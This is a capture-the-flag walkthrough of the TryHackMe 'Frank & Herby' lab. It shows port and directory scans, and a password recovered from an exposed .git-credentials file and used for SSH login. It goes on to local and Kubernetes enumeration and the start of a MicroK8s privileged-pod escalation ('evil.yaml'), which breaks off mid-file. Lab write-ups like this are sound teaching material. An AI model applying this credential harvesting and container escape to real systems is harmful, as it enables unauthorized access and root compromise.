# TryHackMe-Frank & Herby

**Scope:**

- Kubernetes
- Microk8s

**Keywords:**

- Directory Scan & Endpoint Control
- SSH Connection
- Kubernetes Enumeration
- Microk8s

**Main Commands:**

- `nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn --min-rate 1000 --max-retries 3 -p- $target_ip`
- `gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://frank.thm:31337/ -e -x php,txt,html -b 403,404,500,501,502,503 --random-agent -t 70`
- `echo -n 'f%40an3-1s-E337%21%21' | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));"`
- `ssh frank@frank.thm -p 22`

**System Commands:**

- `microk8s kubectl exec -it priv-esc -- /bin/bash`
- `microk8s kubectl apply -f evil.yaml`
- `microk8s kubectl get pod nginx-deployment-7b548976fd-77v4r -o yaml`
- `microk8s kubectl get pods`
- `microk8s kubectl config current-context`
- `microk8s kubectl config get-clusters`
- `microk8s kubectl config get-users`
- `microk8s kubectl cluster-info`
- `find / -name "kubectl" 2>/dev/null`
- `ss -tulwn`
- `service --status-all`
- `ps -aux`
- `find / -type f -perm -u=s 2>/dev/null`
- `getcap -r 2>/dev/null`
- `cat /etc/passwd | grep '/bin/bash’`
- `getent group microk8s`

### Laboratory Environment

[Frank & Herby make an app](https://tryhackme.com/r/room/frankandherby)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn --min-rate 1000 --max-retries 3 -p- $target_ip`

```jsx
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 64:79:10:0d:72:67:23:80:4a:1a:35:8e:0b:ec:a1:89 (RSA)
|   256 3b:0e:e7:e9:a5:1a:e4:c5:c7:88:0d:fe:ee:ac:95:65 (ECDSA)
|_  256 d8:a7:16:75:a7:1b:26:5c:a9:2e:3f:ac:c0:ed:da:5c (ED25519)
3000/tcp  open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: JqKyCto33HMrSWRHe
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Sat, 07 Dec 2024 08:46:05 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: JqKyCto33HMrSWRHe
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Sat, 07 Dec 2024 08:46:07 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|_    <meta name="distribution" content
10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dev-01@1633275132
| Subject Alternative Name: DNS:dev-01
| Not valid before: 2021-10-03T14:32:12
|_Not valid after:  2022-10-03T14:32:12
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10257/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 07 Dec 2024 08:46:54 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines, Help, Kerberos, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 07 Dec 2024 08:46:15 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 07 Dec 2024 08:46:16 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1733558673
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2024-12-07T07:04:13
|_Not valid after:  2025-12-07T07:04:13
| tls-alpn: 
|   h2
|_  http/1.1
10259/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost@1733558661
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2024-12-07T07:04:12
|_Not valid after:  2025-12-07T07:04:12
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 07 Dec 2024 08:46:54 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 07 Dec 2024 08:46:15 GMT
|     Content-Length: 185
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
16443/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 07 Dec 2024 08:46:54 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 07 Dec 2024 08:46:15 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 07 Dec 2024 08:46:16 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.146.80, IP Address:172.17.0.1
| Not valid before: 2024-12-07T08:02:31
|_Not valid after:  2025-12-07T08:02:31
| tls-alpn: 
|   h2
|_  http/1.1
25000/tcp open  ssl/http    Gunicorn 19.7.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: gunicorn/19.7.1
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.146.80, IP Address:172.17.0.1
| Not valid before: 2024-12-07T08:02:31
|_Not valid after:  2025-12-07T08:02:31
|_http-title: 404 Not Found
31337/tcp open  http        nginx 1.21.3
|_http-server-header: nginx/1.21.3
|_http-title: Heroic Features - Start Bootstrap Template
32000/tcp open  http        Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
```

> **HTTP Port Check**
> 

`curl -iLX GET http://frank.thm:25000`

```jsx
curl: (56) Recv failure: Connection reset by peer
```

`curl -iLX GET http://frank.thm:32000`

```jsx
HTTP/1.1 200 OK
Cache-Control: no-cache
Date: Sat, 07 Dec 2024 09:30:32 GMT
Content-Length: 0
```

`curl -iLX GET http://frank.thm:31337`

```jsx
HTTP/1.1 200 OK
Server: nginx/1.21.3
Date: Sat, 07 Dec 2024 09:30:54 GMT
Content-Type: text/html
Content-Length: 4795
Last-Modified: Wed, 27 Oct 2021 19:01:10 GMT
Connection: keep-alive
ETag: "6179a1f6-12bb"
Accept-Ranges: bytes

[REDACTED] - MORE
```

> **Directory Scan & Endpoint Control Phase**
> 

`gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://frank.thm:31337/ -e -x php,txt,html -b 403,404,500,501,502,503 --random-agent -t 70`

```jsx
http://frank.thm:31337/index.html           (Status: 200) [Size: 4795]
http://frank.thm:31337/assets               (Status: 301) [Size: 169] [--> http://frank.thm/assets/]
http://frank.thm:31337/css                  (Status: 301) [Size: 169] [--> http://frank.thm/css/]
http://frank.thm:31337/vendor               (Status: 301) [Size: 169] [--> http://frank.thm/vendor/]
http://frank.thm:31337/.git-credentials
```

`curl -iLX GET -D response.txt http://frank.thm:31337/.git-credentials`

```jsx
http://frank:f%40an3-1s-E337%21%21@192.168.100.50
```

`echo -n 'f%40an3-1s-E337%21%21' | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));"`

```jsx
f@an3-1s-E337!!
```

> **SSH Connection Phase**
> 

`ssh frank@frank.thm -p 22`

```jsx
frank@frank.thm's password: f@an3-1s-E337!!

Last login: Fri Oct 29 10:47:08 2021 from 192.168.120.38
frank@dev-01:~$ whoami
frank
frank@dev-01:~$ id
uid=1001(frank) gid=1001(frank) groups=1001(frank),998(microk8s)
frank@dev-01:~$ hostname
dev-01
frank@dev-01:~$ groups
frank microk8s
frank@dev-01:~$ getent group microk8s
microk8s:x:998:herby,frank
frank@dev-01:~$ ls -lsa /home/
total 16
4 drwxr-xr-x  4 root  root  4096 Oct 10  2021 .
4 drwxr-xr-x 21 root  root  4096 Oct 29  2021 ..
4 drwxr-xr-x  6 frank frank 4096 Oct 29  2021 frank
4 drwxr-xr-x  7 herby herby 4096 Oct 29  2021 herby
frank@dev-01:~$ uname -a
Linux dev-01 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
frank@dev-01:~$ dpkg --version
Debian 'dpkg' package management program version 1.19.7 (amd64).
This is free software; see the GNU General Public License version 2 or
later for copying conditions. There is NO warranty.
frank@dev-01:~$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
herby:x:1000:1000:herby:/home/herby:/bin/bash
frank:x:1001:1001:Frank,,867-5309,:/home/frank:/bin/bash
frank@dev-01:~$ 

```

> **Internal System Investigation Phase**
> 

```jsx
frank@dev-01:~$ getcap -r 2>/dev/null
frank@dev-01:~$ find / -type f -perm -u=s 2>/dev/null

/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/core20/1081/usr/bin/chfn
/snap/core20/1081/usr/bin/chsh
/snap/core20/1081/usr/bin/gpasswd
/snap/core20/1081/usr/bin/mount
/snap/core20/1081/usr/bin/newgrp
/snap/core20/1081/usr/bin/passwd
/snap/core20/1081/usr/bin/su
/snap/core20/1081/usr/bin/sudo
/snap/core20/1081/usr/bin/umount
/snap/core20/1081/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1081/usr/lib/openssh/ssh-keysign
/snap/core/11798/bin/mount
/snap/core/11798/bin/ping
/snap/core/11798/bin/ping6
/snap/core/11798/bin/su
/snap/core/11798/bin/umount
/snap/core/11798/usr/bin/chfn
/snap/core/11798/usr/bin/chsh
/snap/core/11798/usr/bin/gpasswd
/snap/core/11798/usr/bin/newgrp
/snap/core/11798/usr/bin/passwd
/snap/core/11798/usr/bin/sudo
/snap/core/11798/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11798/usr/lib/openssh/ssh-keysign
/snap/core/11798/usr/lib/snapd/snap-confine
/snap/core/11798/usr/sbin/pppd
/snap/core/11993/bin/mount
/snap/core/11993/bin/ping
/snap/core/11993/bin/ping6
/snap/core/11993/bin/su
/snap/core/11993/bin/umount
/snap/core/11993/usr/bin/chfn
/snap/core/11993/usr/bin/chsh
/snap/core/11993/usr/bin/gpasswd
/snap/core/11993/usr/bin/newgrp
/snap/core/11993/usr/bin/passwd
/snap/core/11993/usr/bin/sudo
/snap/core/11993/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11993/usr/lib/openssh/ssh-keysign
/snap/core/11993/usr/lib/snapd/snap-confine
/snap/core/11993/usr/sbin/pppd
/snap/core18/2246/bin/mount
/snap/core18/2246/bin/ping
/snap/core18/2246/bin/su
/snap/core18/2246/bin/umount
/snap/core18/2246/usr/bin/chfn
/snap/core18/2246/usr/bin/chsh
/snap/core18/2246/usr/bin/gpasswd
/snap/core18/2246/usr/bin/newgrp
/snap/core18/2246/usr/bin/passwd
/snap/core18/2246/usr/bin/sudo
/snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2246/usr/lib/openssh/ssh-keysign
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/snapd/13270/usr/lib/snapd/snap-confine
/snap/snapd/13640/usr/lib/snapd/snap-confine
/usr/bin/mount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1

frank@dev-01:~$ find /etc -writable 2>/dev/null
frank@dev-01:~$ ps -aux

[REDACTED] - MORE

root        6249  0.0  0.3 713316  6468 ?        Sl   08:06   0:01 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id fc
root        6315  0.0  0.5 141772 10304 ?        Ssl  08:06   0:00 /usr/bin/kube-controllers
root        7262  0.2  0.2 713060  4748 ?        Sl   08:06   0:09 /snap/microk8s/2546/bin/containerd-shim-runc-v1 -namespace k8s.io -id af

[REDACTED] - MORE

frank@dev-01:~$ service --status-all
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ - ]  irqbalance
 [ - ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ - ]  lvm2-lvmpolld
 [ + ]  multipath-tools
 [ - ]  open-iscsi
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  ubuntu-fan
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd
 
frank@dev-01:~$ ss -tulwn
Netid        State         Recv-Q        Send-Q                   Local Address:Port                Peer Address:Port       Process        
icmp6        UNCONN        0             0                               *%eth0:58                             *:*                         
udp          UNCONN        0             0                              0.0.0.0:4789                     0.0.0.0:*                         
udp          UNCONN        0             0                        127.0.0.53%lo:53                       0.0.0.0:*                         
udp          UNCONN        0             0                    10.10.146.80%eth0:68                       0.0.0.0:*                         
tcp          LISTEN        0             4096                         127.0.0.1:10248                    0.0.0.0:*                         
tcp          LISTEN        0             2048                           0.0.0.0:25000                    0.0.0.0:*                         
tcp          LISTEN        0             4096                           0.0.0.0:31337                    0.0.0.0:*                         
tcp          LISTEN        0             4096                         127.0.0.1:10249                    0.0.0.0:*                         
tcp          LISTEN        0             128                          127.0.0.1:27017                    0.0.0.0:*                         
tcp          LISTEN        0             4096                         127.0.0.1:9099                     0.0.0.0:*                         
tcp          LISTEN        0             4096                         127.0.0.1:10251                    0.0.0.0:*                         
tcp          LISTEN        0             4096                         127.0.0.1:10252                    0.0.0.0:*                         
tcp          LISTEN        0             4096                         127.0.0.1:10256                    0.0.0.0:*                         
tcp          LISTEN        0             4096                     127.0.0.53%lo:53                       0.0.0.0:*                         
tcp          LISTEN        0             128                            0.0.0.0:22                       0.0.0.0:*                         
tcp          LISTEN        0             511                            0.0.0.0:3000                     0.0.0.0:*                         
tcp          LISTEN        0             4096                         127.0.0.1:19001                    0.0.0.0:*                         
tcp          LISTEN        0             4096                         127.0.0.1:1338                     0.0.0.0:*                         
tcp          LISTEN        0             4096                         127.0.0.1:37917                    0.0.0.0:*                         
tcp          LISTEN        0             4096                           0.0.0.0:32000                    0.0.0.0:*                         
tcp          LISTEN        0             4096                         127.0.0.1:39043                    0.0.0.0:*                         
tcp          LISTEN        0             4096                                 *:10250                          *:*                         
tcp          LISTEN        0             4096                                 *:10255                          *:*                         
tcp          LISTEN        0             4096                                 *:10257                          *:*                         
tcp          LISTEN        0             4096                                 *:10259                          *:*                         
tcp          LISTEN        0             128                               [::]:22                          [::]:*                         
tcp          LISTEN        0             4096                                 *:16443                          *:*                         

frank@dev-01:~$ ls -lsa
total 48
4 drwxr-xr-x 6 frank frank 4096 Oct 29  2021 .
4 drwxr-xr-x 4 root  root  4096 Oct 10  2021 ..
0 lrwxrwxrwx 1 root  root     9 Oct 29  2021 .bash_history -> /dev/null
4 -rw-r--r-- 1 frank frank  220 Oct 10  2021 .bash_logout
4 -rw-r--r-- 1 frank frank 3771 Oct 10  2021 .bashrc
4 drwx------ 2 frank frank 4096 Oct 10  2021 .cache
4 -rw------- 1 frank frank   50 Oct 27  2021 .git-credentials
4 -rw-rw-r-- 1 frank frank   29 Oct 10  2021 .gitconfig
4 drwxr-x--- 5 frank frank 4096 Oct 10  2021 .kube
4 -rw-r--r-- 1 frank frank  807 Oct 10  2021 .profile
0 lrwxrwxrwx 1 root  root     9 Oct 29  2021 .viminfo -> /dev/null
4 drwxrwxr-x 3 frank frank 4096 Oct 27  2021 repos
4 drwxr-xr-x 3 frank frank 4096 Oct 10  2021 snap
4 -rw-rw-r-- 1 frank frank   17 Oct 29  2021 user.txt

frank@dev-01:~$ ls -lsa
total 48
4 drwxr-xr-x 6 frank frank 4096 Oct 29  2021 .
4 drwxr-xr-x 4 root  root  4096 Oct 10  2021 ..
0 lrwxrwxrwx 1 root  root     9 Oct 29  2021 .bash_history -> /dev/null
4 -rw-r--r-- 1 frank frank  220 Oct 10  2021 .bash_logout
4 -rw-r--r-- 1 frank frank 3771 Oct 10  2021 .bashrc
4 drwx------ 2 frank frank 4096 Oct 10  2021 .cache
4 -rw------- 1 frank frank   50 Oct 27  2021 .git-credentials
4 -rw-rw-r-- 1 frank frank   29 Oct 10  2021 .gitconfig
4 drwxr-x--- 5 frank frank 4096 Oct 10  2021 .kube
4 -rw-r--r-- 1 frank frank  807 Oct 10  2021 .profile
0 lrwxrwxrwx 1 root  root     9 Oct 29  2021 .viminfo -> /dev/null
4 drwxrwxr-x 3 frank frank 4096 Oct 27  2021 repos
4 drwxr-xr-x 3 frank frank 4096 Oct 10  2021 snap
4 -rw-rw-r-- 1 frank frank   17 Oct 29  2021 user.txt

frank@dev-01:~$ 
```

> **Kubernetes Enumeration Phase**
> 

**For more information:**

[Kubernetes Enumeration | HackTricks Cloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration)

```jsx
frank@dev-01:~$ ls -lsa .kube
total 20
4 drwxr-x--- 5 frank frank    4096 Oct 10  2021 .
4 drwxr-xr-x 6 frank frank    4096 Oct 29  2021 ..
4 drwxr-x--- 4 frank microk8s 4096 Oct 10  2021 cache
4 drwxr-x--- 3 frank frank    4096 Oct 10  2021 discovery
4 drwxr-x--- 3 frank frank    4096 Oct 10  2021 http

frank@dev-01:~$ find / -name "microk8s" 2>/dev/null

/snap/bin/microk8s
/snap/microk8s
/home/frank/snap/microk8s
/home/herby/snap/microk8s
/var/snap/microk8s

frank@dev-01:~$ find / -name "kubectl" 2>/dev/null

/snap/microk8s/2546/default-args/kubectl
/snap/microk8s/2546/kubectl
/snap/microk8s/2546/microk8s-resources/default-args/kubectl
/var/snap/microk8s/2546/args/kubectl

frank@dev-01:~$ microk8s --version
'--version' is not a valid MicroK8s subcommand.
Available subcommands are:
        add-node
        cilium
        config
        ctr
        dashboard-proxy
        dbctl
        disable
        enable
        helm
        helm3
        istioctl
        join
        juju
        kubectl
        leave
        linkerd
        refresh-certs
        remove-node
        reset
        start
        status
        stop
        inspect
        
frank@dev-01:~$ microk8s kubectl cluster-info
Kubernetes control plane is running at https://127.0.0.1:16443
CoreDNS is running at https://127.0.0.1:16443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.

frank@dev-01:~$ microk8s kubectl get namespaces
NAME                 STATUS   AGE
kube-system          Active   3y65d
kube-public          Active   3y65d
kube-node-lease      Active   3y65d
default              Active   3y65d
container-registry   Active   3y65d

frank@dev-01:~$ microk8s kubectl config get-users
NAME
admin

frank@dev-01:~$ microk8s kubectl config get-contexts
CURRENT   NAME       CLUSTER            AUTHINFO   NAMESPACE
*         microk8s   microk8s-cluster   admin      

frank@dev-01:~$ microk8s kubectl config get-clusters
NAME
microk8s-cluster

frank@dev-01:~$ 

frank@dev-01:~$ microk8s kubectl config current-context
microk8s

frank@dev-01:~$ microk8s kubectl get all
NAME                                    READY   STATUS    RESTARTS   AGE
pod/nginx-deployment-7b548976fd-77v4r   1/1     Running   2          3y41d

NAME                 TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE
service/kubernetes   ClusterIP   10.152.183.1    <none>        443/TCP        3y65d
service/my-service   NodePort    10.152.183.92   <none>        80:31337/TCP   3y41d

NAME                               READY   UP-TO-DATE   AVAILABLE   AGE
deployment.apps/nginx-deployment   1/1     1            1           3y41d

NAME                                          DESIRED   CURRENT   READY   AGE
replicaset.apps/nginx-deployment-7b548976fd   1         1         1       3y41d

frank@dev-01:~$ 
```

> **Privilege Escalation with Microk8s Phase**
> 

**For more information:**

[MicroK8s - Privilege Escalation (CVE-2019-15789)](https://pulsesecurity.co.nz/advisories/microk8s-privilege-escalation)

```jsx
frank@dev-01:~$ microk8s kubectl get pods
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          3y41d

frank@dev-01:~$ microk8s kubectl get pod nginx-deployment-7b548976fd-77v4r -o yaml

apiVersion: v1
kind: Pod
metadata:
  annotations:
    cni.projectcalico.org/podIP: 10.1.133.238/32
    cni.projectcalico.org/podIPs: 10.1.133.238/32
  creationTimestamp: "2021-10-27T19:48:23Z"
  generateName: nginx-deployment-7b548976fd-
  labels:
    app: nginx
    pod-template-hash: 7b548976fd
  name: nginx-deployment-7b548976fd-77v4r
  namespace: default
  ownerReferences:
  - apiVersion: apps/v1
    blockOwnerDeletion: true
    controller: true
    kind: ReplicaSet
    name: nginx-deployment-7b548976fd
    uid: 3e23e71f-b91a-41de-a65a-e50629eb51ec
  resourceVersion: "1811226"
  selfLink: /api/v1/namespaces/default/pods/nginx-deployment-7b548976fd-77v4r
  uid: 29879983-7b7f-4143-a8b9-1eb34951fd6d
spec:
  containers:
  - image: localhost:32000/bsnginx
    imagePullPolicy: Always
    name: nginx
    ports:
    - containerPort: 80
      protocol: TCP
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /usr/share/nginx/html
      name: local-stuff
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-hc88j
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: dev-01
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - hostPath:
      path: /home/frank/repos/dk-ml/assets
      type: ""
    name: local-stuff
  - name: kube-api-access-hc88j
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2021-10-27T19:48:23Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2024-12-07T08:06:41Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2024-12-07T08:06:41Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2021-10-27T19:48:23Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://af86cd4843dde35407fc4f82b1acce875617df8bb6898c89b07d1bf1bf42957e
    image: localhost:32000/bsnginx:latest
    imageID: localhost:32000/bsnginx@sha256:59dafb4b06387083e51e2589773263ae301fe4285cfa4eb85ec5a3e70323d6bd
    lastState:
      terminated:
        containerID: containerd://a56f86268143a36ec7c2c06cd92ea57e2014e5a692e22f592865985c841243a0
        exitCode: 255
        finishedAt: "2021-10-29T12:09:13Z"
        reason: Unknown
        startedAt: "2021-10-29T02:17:45Z"
    name: nginx
    ready: true
    restartCount: 2
    started: true
    state:
      running:
        startedAt: "2024-12-07T08:06:40Z"
  hostIP: 10.10.146.80
  phase: Running
  podIP: 10.1.133.238
  podIPs:
  - ip: 10.1.133.238
  qosClass: BestEffort
  startTime: "2021-10-27T19:48:23Z"
  
  
frank@dev-01:~$ cd repos/dk-ml
frank@dev-01:~/repos/dk-ml$ nano evil.yaml

apiVersion: v1
kind: Pod
metadata:
  name: priv-esc
spec:
  containers:
  - name: shell
